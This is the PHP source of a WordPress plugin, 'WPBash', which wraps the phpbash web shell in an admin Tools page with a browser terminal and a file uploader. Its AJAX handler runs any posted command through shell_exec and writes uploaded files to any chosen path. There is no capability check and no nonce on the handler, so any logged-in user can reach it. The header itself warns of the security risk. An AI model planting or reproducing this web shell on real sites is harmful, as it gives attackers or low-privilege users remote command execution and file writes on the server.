<?php

/**
 * Plugin Name: WPBash
 * Description: A Wordpress plugin wrapper for [phpbash](https://github.com/Arrexel/phpbash), a standalone, semi-interactive web shell. This script represent a security risk, use with caution.
 * Version: 1.0
 * Author: Juan Pablo Juliao
 * Author URI: jpjuliao.com
 */
 
Namespace Jpjuliao\WPBash;

if (!defined('ABSPATH')) {
    exit;
}

new WPBash();
 
class WPBash
{

    /**
     * Autoload
     * @return void
     */
    public function __construct()
    {
        add_action('wp_ajax_wpbash', [$this, 'controller']);
        add_action('admin_menu', [$this, 'register_page']);
        add_action('admin_enqueue_scripts', [$this, 'enqueue_scripts']);
    }

    /**
     * Page URL
     */
    public $page_url;
        
    /**
     * Register menu
     * @return void
     */
    public function register_page()
    {
        add_submenu_page(
            'tools.php',
            'WPBash',
            'WPBash',
            'manage_options',
            'wpbash',
            array($this, 'view')
        );
        $this->page_url = menu_page_url('wpbash', $echo = false);
    }

    /**
     * Controller
     * @return void
     */
    public function controller()
    {
        if (isset($_POST['cmd'])) {
            $output = preg_split('/[\n]/', shell_exec($_POST['cmd']." 2>&1"));
            foreach ($output as $line) {
                echo htmlentities($line, ENT_QUOTES | ENT_HTML5, 'UTF-8') . "<br>";
            }
            die();
        } elseif (!empty($_FILES['file']['tmp_name']) && !empty($_POST['path'])) {
            $filename = $_FILES["file"]["name"];
            $path = $_POST['path'];
            if ($path != "/") {
                $path .= "/";
            }
            if (move_uploaded_file($_FILES["file"]["tmp_name"], $path.$filename)) {
                echo htmlentities($filename) . " successfully uploaded to " . htmlentities($path);
            } else {
                echo "Error uploading " . htmlentities($filename);
            }
            die();
        }
    }

    /**
     * View
     * @return void
     */
    public function view()
    {
        ?>
        <style>
            .inputtext {
                font-family: "Lucida Console", "Lucida Sans Typewriter", monaco, "Bitstream Vera Sans Mono", monospace;
                font-size: 14px;
                font-style: normal;
                font-variant: normal;
                font-weight: 400;
                line-height: 20px;
                overflow: hidden;
            }
        
            .console {
                width: 100%;
                height: 500px;
                margin: auto;
                position: absolute;
                color: #fff;
                background: black;
            }
            
            .output {
                width: auto;
                height: auto;
                position: absolute;
                overflow-y: scroll;
                top: 0;
                bottom: 30px;
                left: 5px;
                right: 0;
                line-height: 20px;
            }
                                 
            .input form {
                position: relative;
                margin-bottom: 0px;
            }
                     
            .username {
                height: 30px;
                width: auto;
                padding-left: 5px;
                line-height: 30px;
                float: left;
            }

            .input {
                border-top: 1px solid #333333;
                width: 100%;
                height: 30px;
                position: absolute;
                bottom: 0;
            }

            .inputtext {
                width: auto;
                height: 30px;
                bottom: 0px;
                margin-bottom: 0px;
                background: #000;
                border: 0;
                float: left;
                padding-left: 8px;
                color: #fff;
            }
            
            .inputtext:focus {
                outline: none;
            }

            ::-webkit-scrollbar {
                width: 12px;
            }

            ::-webkit-scrollbar-track {
                background: #101010;
            }

            ::-webkit-scrollbar-thumb {
                background: #303030; 
            }
        </style>
        <div class="console">
            <div class="output" id="wpbash_output"></div>
            <div class="input" id="wpbash_input">
                <form id="wpbash_form" method="GET" onSubmit="sendCommand()">
                    <div class="username" id="wpbash_username"></div>
                    <input class="inputtext" id="wpbash_inputtext" type="text" name="cmd" autocomplete="off" autofocus>
                    <input type="submit" value="send">
                </form>
            </div>
        </div>
        <form id="wpbash_upload" method="POST" style="display: none;">
            <input type="file" name="file" id="wpbash_filebrowser" onchange='uploadFile()' />
            <input type="submit" value="send">
        </form>
        <script>
            
            var username = "";
            var hostname = "";
            var currentDir = "";
            var previousDir = "";
            var defaultDir = "";
            var commandHistory = [];
            var currentCommand = 0;
            var inputTextElement = document.getElementById('wpbash_inputtext');
            var inputElement = document.getElementById("wpbash_input");
            var outputElement = document.getElementById("wpbash_output");
            var usernameElement = document.getElementById("wpbash_username");
            var uploadFormElement = document.getElementById("wpbash_upload");
            var fileBrowserElement = document.getElementById("wpbash_filebrowser");
            getShellInfo();

            function getShellInfo() {
                var request = new XMLHttpRequest();
                
                request.onreadystatechange = function() {
                    if (request.readyState == XMLHttpRequest.DONE) {
                        var parsedResponse = request.responseText.split("<br>");
                        username = parsedResponse[0];
                        hostname = parsedResponse[1];
                        currentDir =  parsedResponse[2].replace(new RegExp("&sol;", "g"), "/");
                        defaultDir = currentDir;
                        usernameElement.innerHTML = "<div style='color: #ff0000; display: inline;'>"+username+"@"+hostname+"</div>:"+currentDir+"#";
                        updateInputWidth();
                    }
                };

                request.open("POST", "/wp-admin/admin-ajax.php", true);
                request.setRequestHeader("Content-type", "application/x-www-form-urlencoded");
                request.send("cmd=whoami&hostname&pwd&action=wpbash");
            }
                        
            function sendCommand() {
                var request = new XMLHttpRequest();
                var command = inputTextElement.value;
                var originalCommand = command;
                var originalDir = currentDir;
                var cd = false;
                
                commandHistory.push(originalCommand);
                switchCommand(commandHistory.length);
                inputTextElement.value = "";

                var parsedCommand = command.split(" ");
                
                if (parsedCommand[0] == "cd") {
                    cd = true;
                    if (parsedCommand.length == 1) {
                        command = "cd "+defaultDir+"; pwd";
                    } else if (parsedCommand[1] == "-") {
                        command = "cd "+previousDir+"; pwd";
                    } else {
                        command = "cd "+currentDir+"; "+command+"; pwd";
                    }
                    
                } else if (parsedCommand[0] == "clear") {
                    outputElement.innerHTML = "";
                    return false;
                } else if (parsedCommand[0] == "upload") {
                    fileBrowserElement.click();
                    return false;
                } else {
                    command = "cd "+currentDir+"; " + command;
                }
                
                request.onreadystatechange = function() {
                    if (request.readyState == XMLHttpRequest.DONE) {
                        if (cd) {
                            var parsedResponse = request.responseText.split("<br>");
                            previousDir = currentDir;
                            currentDir = parsedResponse[0].replace(new RegExp("&sol;", "g"), "/");
                            outputElement.innerHTML += "<div style='color:#ff0000; float: left;'>"+username+"@"+hostname+"</div><div style='float: left;'>"+":"+originalDir+"# "+originalCommand+"</div><br>";
                            usernameElement.innerHTML = "<div style='color: #ff0000; display: inline;'>"+username+"@"+hostname+"</div>:"+currentDir+"#";
                        } else {
                            outputElement.innerHTML += "<div style='color:#ff0000; float: left;'>"+username+"@"+hostname+"</div><div style='float: left;'>"+":"+currentDir+"# "+originalCommand+"</div><br>" + request.responseText.replace(new RegExp("<br><br>$"), "<br>");
                            outputElement.scrollTop = outputElement.scrollHeight;
                        } 
                        updateInputWidth();
                    }
                };

                request.open("POST", "/wp-admin/admin-ajax.php", true);
                request.setRequestHeader("Content-type", "application/x-www-form-urlencoded");
                request.send("action=wpbash&cmd="+encodeURIComponent(command));
                return false;
            }

            function uploadFile() {
                var formData = new FormData();
                formData.append('file', fileBrowserElement.files[0], fileBrowserElement.files[0].name);
                formData.append('path', currentDir);
                
                var request = new XMLHttpRequest();
                
                request.onreadystatechange = function() {
                    if (request.readyState == XMLHttpRequest.DONE) {
                        outputElement.innerHTML += request.responseText+"<br>";
                    }
                };

                request.open("POST", "/wp-admin/admin-ajax.php", true);
                request.send(formData);
                outputElement.innerHTML += "<div style='color:#ff0000; float: left;'>"+username+"@"+hostname+"</div><div style='float: left;'>"+":"+currentDir+"# Uploading "+fileBrowserElement.files[0].name+"...</div><br>";
            }

            function updateInputWidth() {
                inputTextElement.style.width = inputElement.clientWidth - usernameElement.clientWidth - 15;
            }

            document.onkeydown = checkForArrowKeys;

            function checkForArrowKeys(e) {
                e = e || window.event;

                if (e.keyCode == '38') {
                    previousCommand();
                } else if (e.keyCode == '40') {
                    nextCommand();
                }
            }

            function previousCommand() {
                if (currentCommand != 0) {
                    switchCommand(currentCommand-1);
                }
            }

            function nextCommand() {
                if (currentCommand != commandHistory.length) {
                    switchCommand(currentCommand+1);
                }
            }

            function switchCommand(newCommand) {
                currentCommand = newCommand;

                if (currentCommand == commandHistory.length) {
                    inputTextElement.value = "";
                } else {
                    inputTextElement.value = commandHistory[currentCommand];
                    setTimeout(function(){ inputTextElement.selectionStart = inputTextElement.selectionEnd = 10000; }, 0);
                }
            }

            document.getElementById("wpbash_form").addEventListener("submit", function(event){
                event.preventDefault()
            });
        </script>
     <?php
    }

    /**
     * Register scripts
     * @return void
     */
    public function enqueue_scripts() {
        $screen = get_current_screen();
        if ($screen->id == 'tools_page_wpbash') {
            wp_enqueue_script( 'wpbash-main-js', plugins_url( 'assets/main.js', __FILE__ ), '1.0', true );
        }
    }
}
